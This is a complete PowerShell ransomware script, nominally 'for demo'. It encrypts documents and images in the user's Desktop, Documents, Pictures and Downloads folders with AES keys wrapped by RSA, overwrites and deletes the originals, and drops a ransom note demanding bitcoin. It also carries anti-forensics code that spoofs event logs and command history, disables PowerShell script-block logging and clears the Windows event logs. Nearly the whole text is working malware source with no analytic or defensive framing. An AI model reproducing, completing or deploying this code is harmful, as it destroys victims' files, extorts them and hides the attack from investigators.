# === Hard-coded RSA Public Key (for demo) ===
$publicKeyXml = "paste your public key ine here "
$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider(2048)
$rsa.PersistKeyInCsp = $false
$rsa.FromXmlString($publicKeyXml)

# === Target Directories ===
$folders = @(
    [Environment]::GetFolderPath("Desktop"),
    [Environment]::GetFolderPath("MyDocuments"),
    [Environment]::GetFolderPath("MyPictures"),
    "$env:USERPROFILE\Downloads"
)

# === File Extensions ===
$extensions = @("*.docx", "*.pdf", "*.jpg", "*.xlsx")

# === Generate Unique Marker ===
function Get-EncryptionMarker {
    return [Convert]::ToBase64String([Guid]::NewGuid().ToByteArray()).Substring(0, 8)
}

# === Encrypt Function with Anti-Forensics ===
function Encrypt-File {
    param ([string]$filePath, $rsa)
    try {
        if ($filePath -like "*.enc") { return }
        $data = [System.IO.File]::ReadAllBytes($filePath)
        if ($data.Length -eq 0) { return }

        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.KeySize = 256
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.GenerateKey()
        $aes.GenerateIV()
        $encryptor = $aes.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($data, 0, $data.Length)

        $encryptedAESKey = $rsa.Encrypt($aes.Key, $true)
        $encryptedAESIV = $rsa.Encrypt($aes.IV, $true)

        $marker = Get-EncryptionMarker
        $markerBytes = [System.Text.Encoding]::UTF8.GetBytes($marker)
        $finalData = $markerBytes + $encryptedAESKey + $encryptedAESIV + $encryptedData

        $newFilePath = "$filePath.enc"
        [System.IO.File]::WriteAllBytes($newFilePath, $finalData)

        $randomData = New-Object byte[] $data.Length
        (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($randomData)
        [System.IO.File]::WriteAllBytes($filePath, $randomData)
        Remove-Item $filePath -Force
    }
    catch {
        Add-Content -Path "$env:TEMP\encrypt_err.log" -Value "[-] Failed: $filePath - $_" -ErrorAction SilentlyContinue
    }
    finally {
        if ($aes) { $aes.Dispose() }
    }
}

# === Anti-Forensics: Spoof Event Logs ===
function Spoof-EventLogs {
    $appEvent = @{
        LogName   = "Application"
        Source    = "Application"
        EventID   = 1000
        Message   = "System update completed at $(Get-Date)"
    }
    if (-not (Get-EventLog -LogName "Application" -Source "Application" -ErrorAction SilentlyContinue)) {
        New-EventLog -LogName "Application" -Source "Application" -ErrorAction SilentlyContinue
    }
    Write-EventLog @appEvent -ErrorAction SilentlyContinue
}

# === Anti-Forensics: Spoof Command History ===
function Spoof-CommandHistory {
    Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
    @("dir", "whoami", "systeminfo") | Out-File "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Encoding utf8 -ErrorAction SilentlyContinue
}

# === Anti-Forensics: Clear Event Logs ===
function Clear-EventLogs {
    $logs = @("Application", "System", "Security", "Windows PowerShell")
    foreach ($log in $logs) {
        try {
            wevtutil cl $log
        } catch {
            Add-Content -Path "$env:TEMP\encrypt_err.log" -Value "[-] Failed to clear $log log: $_"
        }
    }
}

# === Disable ScriptBlock Logging ===
function Disable-PowerShellLogging {
    try {
        New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force | Out-Null
        Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force
    } catch {
        Add-Content -Path "$env:TEMP\encrypt_err.log" -Value "[-] Failed to disable ScriptBlockLogging: $_"
    }
}

# === Random Delay ===
Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)

# === Encrypt Files ===
foreach ($folder in $folders) {
    foreach ($ext in $extensions) {
        Get-ChildItem -Path $folder -Recurse -Filter $ext -File -ErrorAction SilentlyContinue | 
        ForEach-Object { Encrypt-File -filePath $_.FullName -rsa $rsa }
    }
}

# === Anti-Forensics Actions ===
Spoof-EventLogs
Spoof-CommandHistory
Disable-PowerShellLogging
Clear-EventLogs

# === Drop Ransom Note ===
$marker = Get-EncryptionMarker
$ransomNote = @"
YOUR FILES HAVE BEEN ENCRYPTED WITH RSA-2048/AES-256!
Victim ID: $marker
Computer: $env:COMPUTERNAME
User: $env:USERNAME

Send 0.5 BTC to: [BTC_ADDRESS]
Email your Victim ID to: badguy@example.com

DO NOT attempt to decrypt or delete this note!
"@
$ransomPaths = @(
    "$env:USERPROFILE\Desktop\READ_ME_TO_RESTORE.txt",
    "$env:USERPROFILE\Documents\READ_ME_TO_RESTORE.txt",
    "C:\Users\Public\READ_ME_TO_RESTORE.txt"
)
foreach ($path in $ransomPaths) {
    $ransomNote | Out-File -Encoding UTF8 -FilePath $path -ErrorAction SilentlyContinue
}

# === Cleanup ===
Remove-Item "$env:TEMP\encrypt.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\encrypt_err.log" -Force -ErrorAction SilentlyContinue
